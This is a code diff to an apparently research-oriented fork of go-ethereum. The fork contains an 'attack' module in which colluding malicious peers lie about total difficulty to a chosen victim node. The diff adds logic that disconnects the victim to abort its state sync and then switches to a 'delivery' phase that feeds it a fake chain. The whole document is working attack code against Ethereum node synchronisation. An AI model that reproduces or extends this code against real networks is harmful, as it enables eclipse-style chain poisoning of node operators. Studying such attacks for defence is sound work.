@@ -10,6 +10,7 @@ import "runtime"
 import "github.com/ethereum/go-ethereum/p2p"
 import "github.com/ethereum/go-ethereum/ethdb"
 import "github.com/ethereum/go-ethereum/core/types"
+//import "github.com/ethereum/go-ethereum/common"
 import "github.com/ethereum/go-ethereum/attack/msg"
 import "github.com/ethereum/go-ethereum/attack/utils"
 
@@ -41,6 +42,8 @@ var avoidVictim bool			// Despite we need to only avoid connecting to the victim
 								// some moments, when this variable is set the peer will not
 								// accept/dial any new p2p peer.
 var lastOracleBit bool
+var terminatingStateSync bool
+//var servedAccounts *big.Int
 
 
 
@@ -92,7 +95,9 @@ func Initialize(id string) error {
 	higherTd = utils.HigherTd
 	avoidVictim = false
 	lastOracleBit = false
+	terminatingStateSync = false
 	p2p.NoNewConnections = &avoidVictim
+	//servedAccounts = big.NewInt(0)
 
 	incoming = make(chan []byte)
 	go readLoop(conn, incoming, quitCh)
@@ -341,6 +346,32 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 	}
 }
 
+func ServedLastRangeQuery() {
+	/*
+	Upon receiving last query of state sync, we need to make the current syncOp fail.
+	To do so, we disconnect from the victim.
+	*/
+
+	if !master {
+		victimLock.Lock()
+		terminatingStateSync = true
+		victim.Disconnect(p2p.DiscUselessPeer)		// Is this enough to make the victim immediately fail the syncOp?
+		victimLock.Unlock()
+	}
+}
+
+/*
+func ServedAccountRange(lastResponse bool) {
+	
+	amount := new(big.Int).Sub(to.Big(), from.Big())
+	servedAccounts.Add(servedAccounts, amount)
+	log("Served accounts:", servedAccounts)
+	
+
+	if master && lastResponse
+}
+*/
+
 /*
 func areAllBatchesServed() bool {
 	for _, served := range servedBatches {
@@ -402,18 +433,18 @@ func SetTrueChain(db ethdb.Database) {
 func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 	select {
 	case <-quitCh:
-		return higherTd, false, utils.BridgeClosedErr
+		return nil, false, utils.BridgeClosedErr
 		
 	default:
 		//Don't do anything if we are not ready yet
 		if attackPhase==utils.StalePhase {
-			return higherTd, false, nil
+			return nil, false, nil
 		}
 
 		// Don't cheat to other malicious peers!
 		if IsMalicious(peerID) {
 			log("Not cheating about TD to peer", peerID)
-			return higherTd, false, nil
+			return nil, false, nil
 		}
 
 		/*	Don't cheat to nodes already in sync.
@@ -434,19 +465,41 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 																		// the syncPhase.
 			predictionTD := getTd(utils.PredictionChain)
 			if peerTD.Cmp(predictionTD) > 0 {
-				return higherTd, false, nil
+				return nil, false, nil
 			}
 			log("Cheating to peer", peerID, "if necessary at this point")
 			return higherTd, mustCheatAboutTd, nil
 		}
 
-		if (attackPhase == utils.PredictionPhase && lastOracleBit) || attackPhase == utils.SyncPhase {
-			td := new(big.Int).Add(getTd(utils.TrueChain), utils.DifficultySupplement)
-			log("Cheating to peer", peerID, "if necessary at this point")
+		// Below this point, we are already in some later stage of the attack. Therefore, we have to cheat
+		// only to our victim.
+		if peerID != victimID {
+			return nil, false, nil
+		}
+
+		// From here on, it is implicit that we are dealing with the victim.
+
+		if (attackPhase == utils.PredictionPhase && lastOracleBit) ||
+		   (attackPhase == utils.SyncPhase && !terminatingStateSync) {
+				td := new(big.Int).Add(getTd(utils.TrueChain), utils.DifficultySupplement)
+				return td, mustCheatAboutTd, nil
+		}
+
+		if (attackPhase==utils.SyncPhase && terminatingStateSync) || attackPhase == utils.DeliveryPhase {
+			td := getTd(utils.FakeChain)		// For now, I am assuming the fake chain has the total difficulty
+												// from genesis and not just the difficulty of the fake segment.
+
+			go func() {
+				err := sendMessage(msg.TerminatingStateSync)
+				if err != nil {
+					fatal(err, "Could not notify state sync termination")
+				}
+			}()
+
 			return td, mustCheatAboutTd, nil
 		}
 	}
-	return higherTd, mustCheatAboutTd, nil // This line is wrong, just to return smthg
+	return nil, false, nil // This line should never be hit
 }
 
 /*
@@ -556,6 +609,10 @@ func IsVictim(id string) bool {
 	return victimID==id
 }
 
+func IsMaster() bool {
+	return master
+}
+
 func DelayBeforeServingBatch() {
 	time.Sleep(3*time.Second)
 }
@@ -572,9 +629,10 @@ func WaitBeforePivoting() {
 }
 
 func PivotingServed() {
-	//time.Sleep(100*time.Millisecond)
 	log("Pivoting request served")
-	canDisconnect <- true
+	if attackPhase == utils.PredictionPhase || (attackPhase == utils.SyncPhase && terminatingStateSync) {
+		canDisconnect <- true
+	}
 }
 
 func WaitBeforeLastFullBatch() {
@@ -684,6 +742,19 @@ func handleMessages() {
 				}
 			case msg.LastOracleBit.Code:
 				lastOracleBit = true
+			case msg.TerminatingStateSync.Code:
+				terminatingStateSync = true
+				go func() {
+					<-canDisconnect
+					victim.Disconnect(p2p.DiscUselessPeer)
+					attackPhase = utils.DeliveryPhase
+					err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
+					if err != nil {
+						fatal(err, "Could not notify switch to", attackPhase, "phase")
+					}
+					log("Switched to", attackPhase, "phase")
+					mustChangeAttackChain = true
+				}()
 			/*
 			case msg.MustDisconnectVictim.Code:
 				switch message.Content[0] {
